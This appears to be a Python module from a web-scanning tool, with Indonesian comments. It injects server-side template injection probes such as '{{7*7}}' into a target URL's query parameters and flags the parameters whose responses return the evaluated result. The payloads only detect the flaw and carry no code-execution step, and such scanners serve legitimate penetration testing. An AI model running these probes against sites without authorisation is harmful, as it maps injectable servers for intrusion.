import requests
import urllib.parse
import copy
from colorama import Fore, Style

class SSTIEngine:
    def __init__(self, target_url):
        self.target = target_url
        self.session = requests.Session()
        self.session.headers = {'User-Agent': 'ZeroBurst-SSTI-Hunter/12.0'}
        
        self.parsed = urllib.parse.urlparse(target_url)
        self.params = urllib.parse.parse_qs(self.parsed.query)
        self.base_url = target_url.split("?")[0]

        # PAYLOAD DATABASE (Math Calculation Test)
        # Jika {{7*7}} berubah jadi 49, berarti template engine mengeksekusinya.
        self.payloads = [
            # 1. Jinja2 (Python) / Twig (PHP)
            {'engine': 'Jinja2/Twig', 'pay': '{{7*7}}', 'expect': '49'},
            
            # 2. Smarty (PHP)
            {'engine': 'Smarty', 'pay': '{$smarty.version}', 'expect': 'Smarty'},
            {'engine': 'Smarty', 'pay': '{7*7}', 'expect': '49'},
            
            # 3. FreeMarker (Java) / EL
            {'engine': 'FreeMarker/Java', 'pay': '${7*7}', 'expect': '49'},
            {'engine': 'FreeMarker (Legacy)', 'pay': '#{7*7}', 'expect': '49'},
            
            # 4. Velocity (Java)
            {'engine': 'Velocity', 'pay': '#set($a=7*7)${a}', 'expect': '49'},
            
            # 5. Mako (Python)
            {'engine': 'Mako', 'pay': '${7*7}', 'expect': '49'},
            
            # 6. ERB (Ruby)
            {'engine': 'ERB (Ruby)', 'pay': '<%= 7*7 %>', 'expect': '49'},
            
            # 7. Spring/Thymeleaf (Java)
            {'engine': 'Spring/Thymeleaf', 'pay': '__${7*7}__::.x', 'expect': '49'},
        ]

    def run_scan(self):
        print(f"\n{Fore.CYAN}[*] MODULE START: Server-Side Template Injection (SSTI) Hunter{Style.RESET_ALL}")
        print(f"{Fore.WHITE}[*] Target: {Fore.GREEN}{self.target}")
        print(f"{Fore.WHITE}[*] Method: Polyglot Math Injection (7*7 = 49 detection)")
        
        if not self.params:
            print(f"{Fore.RED}[!] No parameters found to inject.{Style.RESET_ALL}")
            return

        total_vulns = 0

        for param, values in self.params.items():
            print(f"\n{Fore.WHITE}>>> Inspecting Parameter: {Fore.GREEN}'{param}'{Style.RESET_ALL}")
            
            # Ambil nilai asli parameter untuk referensi
            original_val = values[0]
            param_vulnerable = False

            for p in self.payloads:
                if param_vulnerable: break # Stop jika sudah vuln di parameter ini

                # Construct Payload
                new_params = copy.deepcopy(self.params)
                # Kita coba GANTI nilai asli, dan juga coba APPEND (tambah di belakang)
                # Di sini kita pakai replace dulu
                new_params[param] = [p['pay']]
                
                query = urllib.parse.urlencode(new_params, doseq=True)
                attack_url = f"{self.base_url}?{query}"
                
                try:
                    res = self.session.get(attack_url, timeout=5)
                    content = res.text

                    # DETECTION LOGIC
                    # Jika respon mengandung string yang kita harapkan (misal "49")
                    # TAPI kita harus hati-hati agar tidak false positive (misal di halaman emang ada angka 49)
                    
                    if p['expect'] in content:
                        # Verifikasi sederhana: Cek apakah nilai asli (misal "home") hilang?
                        # Atau cek apakah "49" benar-benar hasil render.
                        
                        # Untuk tools heuristic, jika payload {{7*7}} menghasilkan 49, itu 99% vuln.
                        print(f"   {Fore.RED}[CRITICAL] SSTI DETECTED! ({p['engine']}){Style.RESET_ALL}")
                        print(f"   ├── Payload Sent : {Fore.YELLOW}{p['pay']}{Style.RESET_ALL}")
                        print(f"   ├── Result Found : {Fore.MAGENTA}'{p['expect']}'{Style.RESET_ALL} (Math executed)")
                        print(f"   └── Link PoC     : {attack_url}")
                        
                        total_vulns += 1
                        param_vulnerable = True
                        
                except Exception as e:
                    pass
        
        print("-" * 60)
        if total_vulns > 0:
            print(f"{Fore.RED}[!!!] SCAN COMPLETE: {total_vulns} potential SSTI vectors found.{Style.RESET_ALL}")
            print(f"{Fore.WHITE}Impact: RCE (Remote Code Execution), Server Takeover.")
        else:
            print(f"{Fore.GREEN}[OK] Target appears safe from basic SSTI payloads.{Style.RESET_ALL}")

def run_ssti_scan(url):
    engine = SSTIEngine(url)
    engine.run_scan()